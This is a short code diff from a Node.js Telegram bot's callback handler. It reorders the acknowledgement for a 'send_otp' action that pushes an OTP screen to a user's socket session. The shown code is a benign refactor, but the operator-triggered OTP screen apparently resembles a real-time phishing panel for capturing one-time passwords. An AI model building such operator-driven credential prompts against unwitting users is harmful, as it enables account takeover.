@@ -273,15 +273,15 @@ bot.on('callback_query', async (callbackQuery) => {
 
   switch (action) {
     case 'send_otp': {
+       await bot.answerCallbackQuery(callbackQuery.id, {
+      text: '✅ OTP screen sent to user'
+    });
       console.log('Sending OTP screen to socket:', sessionId);
       console.log('=== SEND OTP DEBUG ===');
       console.log('Session ID:', sessionId);
       console.log('Socket exists?', !!socket);
       console.log('Socket connected?', socket?.connected);
     socket.emit('show-otp-screen');
-    await bot.answerCallbackQuery(callbackQuery.id, {
-      text: '✅ OTP screen sent to user'
-    });
     await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
       chat_id: chatId,
       message_id: messageId
